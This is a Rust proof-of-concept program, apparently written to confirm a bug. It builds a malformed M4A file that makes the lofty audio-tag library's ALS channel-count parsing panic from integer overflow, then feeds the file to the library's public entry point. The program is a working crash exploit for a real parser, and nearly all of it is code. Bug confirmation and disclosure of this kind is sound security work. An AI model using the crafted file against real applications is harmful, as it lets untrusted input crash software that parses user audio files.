// End-to-end repro: a crafted MP4/M4A file on disk carries an `stsd` -> `mp4a` -> `esds`
// AudioSpecificConfig selecting the ALS (Audio Lossless Coding, object_type == 36) branch, with
// a trailing "channel count minus 1" `u16` field whose low byte is 0xFF (0xFFFF here).
//
// The file is read back with lofty's real public entry point, `lofty::read_from_path`, which
// drives the actual `Mp4File`/`AtomReader`/`mp4a_properties` parsing path - the same path any
// caller opening an untrusted `.m4a`/`.mp4` file goes through. This is the "malformed file handed
// to a parser's real public entry point" case from CONFIRMATION.md section 11: the crafted bytes
// on disk ARE the genuine external input, there is no second participant to fake here.
//
// `lofty/src/mp4/properties.rs`'s ALS branch does:
//     properties.channels = Some(stsd.read_u16()? as u8 + 1);
// which truncates the `u16` to `u8` before adding 1, panicking with "attempt to add with
// overflow" under the default dev/test profile's `overflow-checks = true` whenever the on-disk
// value's low byte is 0xFF, and silently wrapping (e.g. reporting 0 channels) in release builds.

use lofty::file::AudioFile;

use std::io::Write;

fn atom(fourcc: &[u8; 4], content: &[u8]) -> Vec<u8> {
    let len = (content.len() + 8) as u32;
    let mut out = Vec::with_capacity(content.len() + 8);
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(fourcc);
    out.extend_from_slice(content);
    out
}

fn build_mp4() -> Vec<u8> {
    // ftyp
    let mut ftyp_content = Vec::new();
    ftyp_content.extend_from_slice(b"M4A "); // major brand
    ftyp_content.extend_from_slice(&0u32.to_be_bytes()); // minor version
    let ftyp = atom(b"ftyp", &ftyp_content);

    // mdhd (version 0), duration = 0 so the mdat-dependent bitrate code path is never taken
    let mut mdhd_content = Vec::new();
    mdhd_content.extend_from_slice(&0u32.to_be_bytes()); // version(1) + flags(3)
    mdhd_content.extend_from_slice(&0u32.to_be_bytes()); // creation time
    mdhd_content.extend_from_slice(&0u32.to_be_bytes()); // modification time
    mdhd_content.extend_from_slice(&1000u32.to_be_bytes()); // timescale
    mdhd_content.extend_from_slice(&0u32.to_be_bytes()); // duration = 0
    let mdhd = atom(b"mdhd", &mdhd_content);

    // hdlr: 8 dummy bytes then "soun"
    let mut hdlr_content = Vec::new();
    hdlr_content.extend_from_slice(&[0u8; 8]);
    hdlr_content.extend_from_slice(b"soun");
    let hdlr = atom(b"hdlr", &hdlr_content);

    // esds: AudioSpecificConfig selecting object_type == 36 (ALS) via the extended-object-type
    // encoding, with a trailing ALS channel-count-minus-1 u16 of 0xFFFF.
    let mut esds_content = Vec::new();
    esds_content.extend_from_slice(&0u32.to_be_bytes()); // version(1)+flags(3), must be 0

    // Elementary stream descriptor (tag 0x03)
    esds_content.push(0x03);
    esds_content.push(0x00); // size varint, single byte, top bit clear
    esds_content.extend_from_slice(&[0u8; 3]); // ES ID(2) + flags(1), skipped by the parser

    // Decoder config descriptor (tag 0x04)
    esds_content.push(0x04);
    esds_content.push(0x00);
    esds_content.push(0x40); // codec byte -> AAC
    esds_content.extend_from_slice(&[0u8; 8]); // stream type(1)+buffer size(3)+max bitrate(4)
    esds_content.extend_from_slice(&0u32.to_be_bytes()); // average bitrate

    // Decoder specific descriptor (tag 0x05) -> AudioSpecificConfig
    esds_content.push(0x05);
    esds_content.push(0x00);

    // byte_a >> 3 == 0b11111 (31) selects the extended object type path.
    // (byte_a & 7) | (byte_b >> 5) == 4  ->  extended object_type = 32 + 4 = 36 (ALS)
    let byte_a: u8 = 0b1111_1_100; // top 5 bits = 11111, low 3 bits = 100 (4)
    let byte_b: u8 = 0x00; // top 3 bits = 0, frequency_index = (byte_b>>1)&0xF = 0
    esds_content.push(byte_a);
    esds_content.push(byte_b);
    // frequency_index (0) < SAMPLE_RATES.len(), and extended_object_type is true, so the parser
    // reads one more byte (byte_c) for the channel configuration before reaching the ALS check.
    let byte_c: u8 = 0x00;
    esds_content.push(byte_c);

    // ALS ident, required verbatim by the parser
    esds_content.extend_from_slice(b"\0ALS\0");
    esds_content.extend_from_slice(&44100u32.to_be_bytes()); // "sample rate"
    esds_content.extend_from_slice(&0u32.to_be_bytes()); // "sample count", skipped

    // The overflow target: `stsd.read_u16()? as u8 + 1`. Low byte 0xFF triggers 255u8 + 1.
    esds_content.extend_from_slice(&0xFFFFu16.to_be_bytes());

    let esds = atom(b"esds", &esds_content);

    // mp4a sample entry
    let mut mp4a_content = Vec::new();
    mp4a_content.extend_from_slice(&[0u8; 6]); // reserved
    mp4a_content.extend_from_slice(&1u16.to_be_bytes()); // data reference index
    mp4a_content.extend_from_slice(&0u16.to_be_bytes()); // stsd entry version 0
    mp4a_content.extend_from_slice(&[0u8; 2]); // revision level
    mp4a_content.extend_from_slice(&[0u8; 4]); // vendor
    mp4a_content.extend_from_slice(&2u16.to_be_bytes()); // channels (initial, unrelated field)
    mp4a_content.extend_from_slice(&16u16.to_be_bytes()); // sample size
    mp4a_content.extend_from_slice(&[0u8; 2]); // compression id
    mp4a_content.extend_from_slice(&[0u8; 2]); // packet size
    mp4a_content.extend_from_slice(&(44100u32 << 16).to_be_bytes()); // sample rate, 16.16 fixed
    mp4a_content.extend_from_slice(&esds);
    let mp4a = atom(b"mp4a", &mp4a_content);

    // stsd
    let mut stsd_content = Vec::new();
    stsd_content.extend_from_slice(&0u32.to_be_bytes()); // version+flags
    stsd_content.extend_from_slice(&1u32.to_be_bytes()); // num sample entries
    stsd_content.extend_from_slice(&mp4a);
    let stsd = atom(b"stsd", &stsd_content);

    let stbl = atom(b"stbl", &stsd);
    let minf = atom(b"minf", &stbl);

    let mut mdia_content = Vec::new();
    mdia_content.extend_from_slice(&mdhd);
    mdia_content.extend_from_slice(&hdlr);
    mdia_content.extend_from_slice(&minf);
    let mdia = atom(b"mdia", &mdia_content);

    let trak = atom(b"trak", &mdia);
    let moov = atom(b"moov", &trak);

    let mut out = Vec::new();
    out.extend_from_slice(&ftyp);
    out.extend_from_slice(&moov);
    out
}

fn main() {
    let bytes = build_mp4();

    let dir = std::env::temp_dir();
    let path = dir.join("mp4_als_channels_overflow_repro.m4a");
    {
        let mut f = std::fs::File::create(&path).expect("create m4a");
        f.write_all(&bytes).expect("write m4a bytes");
    }

    println!(
        "wrote {} byte crafted MP4/M4A file to {}",
        bytes.len(),
        path.display()
    );
    println!("reading it back through lofty::read_from_path (real public entry point)...");

    let tagged_file = lofty::read_from_path(&path).expect("read crafted m4a back from disk");
    let properties = tagged_file.properties();

    // Only reached if the overflow did NOT panic (i.e. the bug is fixed / wraps silently and
    // read_from_path still returns Ok).
    println!("RESULT: no panic. channels reported = {:?}", properties.channels());
}
